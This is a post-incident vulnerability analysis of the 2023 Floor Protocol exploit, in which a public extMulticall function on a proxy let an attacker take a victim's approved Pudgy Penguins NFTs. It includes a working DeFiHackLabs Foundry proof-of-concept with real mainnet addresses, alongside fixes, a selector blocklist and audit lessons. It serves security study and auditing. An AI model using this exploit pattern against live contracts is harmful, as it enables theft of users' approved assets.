# Floor Protocol — Business Logic Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2023-12-17 |
| **Protocol** | Floor Protocol |
| **Chain** | Ethereum |
| **Loss** | ~$1,600,000 (Pudgy Penguins NFTs and other victim-owned NFTs stolen) |
| **Attacker** | [0x4d0d...b847](https://etherscan.io/address/0x4d0d746e0f66bf825418e6b3def1a46ec3c0b847) |
| **Attack Contract** | [0x7e54...1428](https://etherscan.io/address/0x7e5433f02f4bf07c4f2a2d341c450e07d7531428) |
| **Attack Tx** | [0xec8f...b40](https://etherscan.io/tx/0xec8f6d8e114caf8425736e0a3d5be2f93bbea6c01a50a7eeb3d61d2634927b40) |
| **Vulnerable Contract** | [0xc538...edd](https://etherscan.io/address/0xc538d17a6aacc5271be5f51b891e2e92c8187edd) (ERC1967Proxy) |
| **Root Cause** | The `extMulticall` function of ERC1967Proxy allows execution of arbitrary calldata against arbitrary contracts without any caller validation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-12/FloorProtocol_exp.sol) |

---

## 1. Vulnerability Overview

Floor Protocol is an Ethereum-based NFT fractionalization and liquidity protocol. On December 17, 2023, an attacker exploited an access control vulnerability in the `extMulticall` function implemented in Floor Protocol's ERC1967 proxy contract (`0x49AD...EE`) to illegitimately steal Pudgy Penguins (PPG) NFTs that a victim (`0xe544...29`) had previously approved.

The core issue is that the `extMulticall` function is a **publicly callable function** while the `msg.sender` of the internal `call` it executes becomes **the proxy contract itself**. With the victim having already granted the Floor Protocol proxy NFT transfer permissions (operator approval or `approve`), the attacker used `extMulticall` to execute calldata that transferred the victim's NFTs to themselves.

This attack required no flash loan or complex DeFi setup — it drained all of the victim's PPG NFTs in **a single transaction**. This is a textbook example of an **Arbitrary External Call** vulnerability.

---

## 2. Vulnerable Code Analysis

### 2.1 `extMulticall` — Unrestricted Arbitrary External Call (Core Vulnerability)

**Vulnerable Code (reconstructed)**:

```solidity
// Floor Protocol ERC1967Proxy — extMulticall function
// ❌ Vulnerability: No onlyOwner or any authorization check
// ❌ Vulnerability: msg.sender becomes the proxy itself, granting access to all tokens/NFTs victims approved on this contract

struct CallData {
    address target;   // Contract address to call
    bytes callData;   // Calldata to execute (function signature + arguments)
}

// Public function — callable by anyone, no access control modifier ❌
function extMulticall(
    CallData[] memory calls
) external returns (bytes[] memory results) {
    results = new bytes[](calls.length);
    for (uint256 i = 0; i < calls.length; i++) {
        // ❌ No whitelist validation on target or callData
        // ❌ This contract (proxy) executes external calls as msg.sender
        (bool success, bytes memory result) = calls[i].target.call(calls[i].callData);
        require(success, "Multicall failed");
        results[i] = result;
    }
}
```

**Fixed Code**:

```solidity
// ✅ Fix 1: Add access control — only owner or authorized address may call
modifier onlyOwnerOrAuthorized() {
    require(
        msg.sender == owner() || authorized[msg.sender],
        "FloorProtocol: unauthorized caller"
    );
    _;
}

// ✅ Fix 2: Apply whitelist for allowed target contracts
mapping(address => bool) public allowedTargets;

function extMulticall(
    CallData[] memory calls
) external onlyOwnerOrAuthorized returns (bytes[] memory results) {
    results = new bytes[](calls.length);
    for (uint256 i = 0; i < calls.length; i++) {
        // ✅ Only allow calls to whitelisted contracts
        require(allowedTargets[calls[i].target], "FloorProtocol: target not allowed");
        // ✅ Block token transfer function calls such as transferFrom/safeTransferFrom
        bytes4 selector = bytes4(calls[i].callData);
        require(!_isTokenTransferSelector(selector), "FloorProtocol: token transfer functions prohibited");
        (bool success, bytes memory result) = calls[i].target.call(calls[i].callData);
        require(success, "Multicall failed");
        results[i] = result;
    }
}
```

**The Problem**: `extMulticall` is an `external` function callable by anyone, and it accepts arbitrary `target` addresses and `callData` as arguments. When the function executes, `msg.sender` becomes the Floor Protocol proxy contract. Therefore, if a victim has delegated NFT transfer permissions to this proxy (`approve` / `setApprovalForAll`), an attacker can freely steal the victim's NFTs using this function.

### 2.2 NFT Approval Scope Issue

The victim had granted the proxy contract unlimited transfer permissions via `setApprovalForAll` for the legitimate use of Floor Protocol features (e.g., NFT deposits, fractionalization). This is a normal DeFi usage pattern, but when combined with the `extMulticall` vulnerability, it produced catastrophic results.

```solidity
// Transaction signed by victim during normal Floor Protocol usage (normal flow)
// ❌ However, this approval was weaponized due to the extMulticall vulnerability
PPG.setApprovalForAll(address(ERC1967Proxy), true);
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

The victim had previously approved Floor Protocol's ERC1967Proxy as an operator (`setApprovalForAll`) on the PPG (Pudgy Penguins) NFT contract for legitimate protocol use. The attacker needed no flash loan or upfront capital — simply identifying the victim's address and their NFT holdings was sufficient.

### 3.2 Execution Phase

1. **Step 1 — Query victim's NFT holdings**: The attacker queries `balanceOf(victim)` and `tokenOfOwnerByIndex(victim, i)` on the PPG contract to collect all tokenIds held by the victim.

2. **Step 2 — Construct CallData array**: For each tokenId, generate `safeTransferFrom(victim, attacker, tokenId)` calldata, specifying the victim as `from` and the attacker as `to`.

3. **Step 3 — Execute extMulticall**: Call `extMulticall` on the Floor Protocol ERC1967Proxy with the constructed CallData array. The proxy becomes `msg.sender` and executes `safeTransferFrom` on the PPG contract — the transfer succeeds thanks to the victim's prior approval.

4. **Step 4 — Receive NFTs**: The attacker contract implements the `onERC721Received` callback to successfully receive the NFTs.

### 3.3 Attack Flow Diagram

```
Attacker EOA
0x4d0d...b847
    │
    │ 1. Deploy attack contract
    ▼
┌─────────────────────────────────────┐
│  Attack Contract                    │
│  0x7e54...1428                      │
│                                     │
│  testExploit():                     │
│  1) Query PPG.balanceOf(victim)     │
│  2) Iterate tokenOfOwnerByIndex     │
│  3) Build CallData[] array          │
│     target = PPG contract           │
│     data = safeTransferFrom(        │
│              victim,                │
│              this,                  │
│              tokenId)               │
└────────────────┬────────────────────┘
                 │
                 │ 4. Call extMulticall(calls)
                 ▼
┌─────────────────────────────────────┐
│  Floor Protocol ERC1967Proxy        │
│  0x49AD...EE  (vulnerable contract) │
│                                     │
│  extMulticall(CallData[] calls):    │
│  ❌ No access control               │
│  ❌ No callData validation          │
│                                     │
│  for each call:                     │
│    call.target.call(call.callData)  │
│    → msg.sender = proxy itself      │
└────────────────┬────────────────────┘
                 │
                 │ 5. safeTransferFrom(victim, attacker, tokenId)
                 │    msg.sender = ERC1967Proxy (the address victim approved!)
                 ▼
┌─────────────────────────────────────┐
│  Pudgy Penguins NFT Contract        │
│  0xBd35...cf8 (PPG)                 │
│                                     │
│  safeTransferFrom(                  │
│    from=victim,                     │
│    to=attacker,                     │
│    tokenId=N):                      │
│                                     │
│  ✓ isApprovedForAll(victim,         │
│      ERC1967Proxy) == true          │
│  → Transfer approved!               │
└────────────────┬────────────────────┘
                 │
                 │ 6. onERC721Received callback
                 ▼
┌─────────────────────────────────────┐
│  Attack Contract (NFT Receiver)     │
│  All victim PPG NFTs stolen         │
└─────────────────────────────────────┘

Result:
  Victim PPG balance: N → 0
  Attacker PPG balance: 0 → N
  Loss: ~$1,600,000
```

### 3.3 Outcome

- **Attacker profit**: All PPG NFTs held by the victim (market value ~$1,600,000)
- **Protocol/victim loss**: ~$1,600,000
- **Attack complexity**: Very low — no flash loan required, single transaction, no upfront capital needed

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~1,6M
// Attacker : https://etherscan.io/address/0x4d0d746e0f66bf825418e6b3def1a46ec3c0b847
// Attack Contract : https://etherscan.io/address/0x7e5433f02f4bf07c4f2a2d341c450e07d7531428
// Vulnerable Contract : https://etherscan.io/address/0xc538d17a6aacc5271be5f51b891e2e92c8187edd
// Attack Tx : https://explorer.phalcon.xyz/tx/eth/0xec8f6d8e114caf8425736e0a3d5be2f93bbea6c01a50a7eeb3d61d2634927b40

// [Interface] PPG = Pudgy Penguins NFT (ERC721)
interface IPPGToken is IERC721 {
    function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
}

// [Interface] Floor Protocol ERC1967 Proxy — defines the vulnerable extMulticall
interface IERC1967Proxy {
    struct CallData {
        address target;   // Target contract to call
        bytes callData;   // Calldata to execute
    }
    // ❌ Vulnerable function: allows arbitrary external calls with no access control
    function extMulticall(CallData[] memory calls) external returns (bytes[] memory);
}

contract ContractTest is Test {
    // Pudgy Penguins NFT contract
    IPPGToken private constant PPG = IPPGToken(0xBd3531dA5CF5857e7CfAA92426877b022e612cf8);
    // Floor Protocol proxy (vulnerable contract)
    IERC1967Proxy private constant ERC1967Proxy = IERC1967Proxy(0x49AD262C49C7aA708Cc2DF262eD53B64A17Dd5EE);
    // Victim address that approved NFTs to floor protocol
    address private constant victim = 0xe5442aE87E0fEf3F7cc43E507adF786c311a0529;

    function setUp() public {
        // [Fork] Fork mainnet just before the attack block
        vm.createSelectFork("mainnet", 18_802_287);
        vm.label(address(PPG), "PPG");
        vm.label(address(ERC1967Proxy), "ERC1967Proxy");
        vm.label(victim, "victim");
    }

    function testExploit() public {
        emit log_named_uint("Victim PPG balance before attack", PPG.balanceOf(victim));
        emit log_named_uint("Attacker PPG balance before attack", PPG.balanceOf(address(this)));

        // [Step 1] Build transfer calldata for all of the victim's PPG NFTs
        IERC1967Proxy.CallData[] memory calls = new IERC1967Proxy.CallData[](PPG.balanceOf(victim));

        for (uint256 i; i < PPG.balanceOf(victim); ++i) {
            // [Step 2] Query tokenId of the victim's i-th NFT
            uint256 id = PPG.tokenOfOwnerByIndex(victim, i);

            // [Step 3] Encode safeTransferFrom(victim → attacker) calldata
            bytes memory data = abi.encodeWithSignature(
                "safeTransferFrom(address,address,uint256)",
                victim,        // from: victim
                address(this), // to: attacker contract
                id             // tokenId
            );
            calls[i] = IERC1967Proxy.CallData({target: address(PPG), callData: data});
        }

        // [Step 4] ❌ Call vulnerable function — no access control, proxy executes transfers as msg.sender
        // Transfer succeeds because proxy is the victim's approved operator
        ERC1967Proxy.extMulticall(calls);

        emit log_named_uint("Victim PPG balance after attack", PPG.balanceOf(victim));
        emit log_named_uint("Attacker PPG balance after attack", PPG.balanceOf(address(this)));
    }

    // [ERC721 receive callback] Standard interface implementation to receive NFTs
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matched Pattern | Similar Incidents |
|----|--------|--------|-----|-----------|-----------|
| V-01 | Missing Access Control — extMulticall publicly exposed | CRITICAL | CWE-284 | `03_access_control.md` | Poly Network (2021) |
| V-02 | Arbitrary External Call — no target/callData whitelist | CRITICAL | CWE-610 | `03_access_control.md` | Seneca Protocol (2024) |
| V-03 | Overly broad NFT approval scope exploited | HIGH | CWE-732 | `13_nft_vulnerabilities.md` | OpenSea Wyvern (2022) |

### V-01: Missing Access Control — extMulticall Publicly Exposed

- **Description**: The `extMulticall` function lacks an `onlyOwner` or equivalent access control modifier, allowing anyone to call it and execute arbitrary external calls using the proxy contract as the delegate.
- **Impact**: An attacker can steal any token/NFT the victim has approved to the proxy. In this incident, ~$1.6M in PPG NFTs were lost.
- **Attack Conditions**: (1) Victim has granted ERC721 approval to the Floor Protocol proxy, (2) attacker calls `extMulticall` directly.

### V-02: Arbitrary External Call — No target/callData Whitelist

- **Description**: `extMulticall` accepts and executes arbitrary `target` addresses and `callData`, making it possible to invoke any function including ERC20/ERC721 transfer functions. Any asset held by or approved to the proxy can be drained through this vector.
- **Impact**: Withdrawal of tokens/ETH held by the proxy contract; theft of assets from other contracts that trust the proxy.
- **Attack Conditions**: Assets the attacker wants to exploit are approved to or deposited in the proxy.

### V-03: Overly Broad NFT Approval Scope Exploited

- **Description**: The victim granted the Floor Protocol proxy unlimited transfer permissions over all PPG NFTs via `setApprovalForAll`. While this is a normal pattern for protocol usage, it becomes catastrophic when the proxy contains an arbitrary external call vulnerability.
- **Impact**: Approvals users grant in good faith to a protocol are weaponized to steal their assets.
- **Attack Conditions**: User has granted ERC721 approval to a vulnerable protocol.

---

## 6. Remediation Recommendations

### Immediate Actions

**1) Add access control to extMulticall**

```solidity
// ✅ Restrict to owner only
function extMulticall(
    CallData[] memory calls
) external onlyOwner returns (bytes[] memory results) {
    // ...
}
```

**2) Apply target whitelist and function selector blacklist**

```solidity
// ✅ Only whitelisted targets may be called
mapping(address => bool) public allowedTargets;

// ✅ Blocked function selectors (token transfer related)
mapping(bytes4 => bool) public blockedSelectors;

constructor() {
    // Block ERC20/ERC721 transfer-related selectors
    blockedSelectors[IERC20.transfer.selector] = true;
    blockedSelectors[IERC20.transferFrom.selector] = true;
    blockedSelectors[IERC721.transferFrom.selector] = true;
    bytes4 safeTransferFrom = bytes4(keccak256("safeTransferFrom(address,address,uint256)"));
    blockedSelectors[safeTransferFrom] = true;
    bytes4 setApprovalForAll = bytes4(keccak256("setApprovalForAll(address,bool)"));
    blockedSelectors[setApprovalForAll] = true;
}

function extMulticall(
    CallData[] memory calls
) external onlyOwner returns (bytes[] memory results) {
    results = new bytes[](calls.length);
    for (uint256 i = 0; i < calls.length; i++) {
        require(allowedTargets[calls[i].target], "Target not allowed");
        bytes4 selector = bytes4(calls[i].callData);
        require(!blockedSelectors[selector], "Function selector blocked");
        (bool success, bytes memory result) = calls[i].target.call(calls[i].callData);
        require(success, "Call failed");
        results[i] = result;
    }
}
```

**3) Emergency response: pause the vulnerable contract and notify users to revoke approvals**

```solidity
// ✅ Emergency pause mechanism
bool public paused;

modifier whenNotPaused() {
    require(!paused, "Protocol is paused");
    _;
}

function emergencyPause() external onlyOwner {
    paused = true;
    emit EmergencyPaused(msg.sender);
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| extMulticall publicly exposed | Apply `onlyOwner` or `onlyRole(OPERATOR_ROLE)` |
| Arbitrary external call | Introduce allowed-target whitelist + blocked function selector blacklist |
| Overly broad NFT approval | Adopt auto-revoke (`revokeApproval`) pattern upon operation completion |
| Proxy pattern management | Isolate admin functions like `extMulticall` into a separate AdminFacet requiring multisig |
| Monitoring | Build alerting system to detect abnormal bulk NFT transfer activity |

---

## 7. Lessons Learned

1. **Multicall functions require strong access control**: Functions that batch-execute multiple external calls — such as `multicall`, `extMulticall`, and `batchExecute` — must have `onlyOwner` or strict role-based access control (RBAC). A convenience admin function exposed without authorization becomes an attack vector for the entire protocol.

2. **Understand the risks when a proxy becomes msg.sender**: In proxy patterns such as ERC1967, Transparent, and Diamond, executing an external call makes `msg.sender` the proxy contract itself. All approvals a user has granted to the proxy can be exploited in this context, so external calls executed by the proxy must be rigorously validated.

3. **Arbitrary External Call is a CRITICAL vulnerability**: Any function that allows free specification of both the call target and calldata from outside is inherently critical. A combination of an un-whitelisted target and un-blacklisted callData must always be included as an audit item.

4. **Dangers of ERC721 `setApprovalForAll`**: `setApprovalForAll` grants a specific address unlimited transfer rights over all of a user's NFTs. Whenever a protocol requires this approval, every function in that protocol must be verified to be safe. Users should habitually revoke approvals after use.

5. **Severity of single-transaction attacks**: This attack required no flash loan, no complex setup — $1.6M was stolen in a single transaction. A simple logic error can lead to the worst possible outcome, and auditing admin functions is just as important as auditing complex DeFi logic.

6. **Multicall design principles**: When multicall functionality is needed, (1) an owner-only admin multicall and (2) a restricted user-facing multicall should be clearly separated. The user-facing multicall should be constrained to operations on the caller's own assets only.

---

## 8. On-Chain Verification

> Note: The following is compiled from PoC code analysis and publicly available explorer data.

### 8.1 Key Transaction Information

| Field | Value |
|------|-----|
| Attack Block | 18,802,287 |
| Attack Tx | 0xec8f6d8e114caf8425736e0a3d5be2f93bbea6c01a50a7eeb3d61d2634927b40 |
| Additional Attack Tx 1 | 0xfb9942a119c45adab3980639cd829e57b41449e3b82d610892da4bb921e81d9c |
| Additional Attack Tx 2 | 0xa329b27fbe0f7b7f92060a9e5370fdf03d60e5c4835f09d7234e5bbecf417ccf |

### 8.2 Attack Event Log Sequence (reconstructed)

```
1. ContractTest.testExploit() called
2. PPG.balanceOf(victim) queried → returns N
3. Repeat N times:
   - PPG.tokenOfOwnerByIndex(victim, i) queried → returns tokenId
4. ERC1967Proxy.extMulticall(calls) called
5. Repeat N times:
   - PPG.safeTransferFrom(victim, attacker, tokenId) executed
   - Transfer(victim → attacker, tokenId) event emitted
   - attacker.onERC721Received() callback
```

### 8.3 Reference Links

- [Phalcon Transaction Analysis](https://explorer.phalcon.xyz/tx/eth/0xec8f6d8e114caf8425736e0a3d5be2f93bbea6c01a50a7eeb3d61d2634927b40)
- [protos.com Analysis Article](https://protos.com/floor-protocol-exploited-bored-apes-and-pudgy-penguins-gone/)
- [0xfoobar Twitter Analysis](https://twitter.com/0xfoobar/status/1736190355257627064)
- [DeFiMon Attacker Tracking](https://defimon.xyz/exploit/mainnet/0x7e5433f02f4bf07c4f2a2d341c450e07d7531428)

---

*Written: 2026-04-11 | Source: DeFiHackLabs PoC Analysis*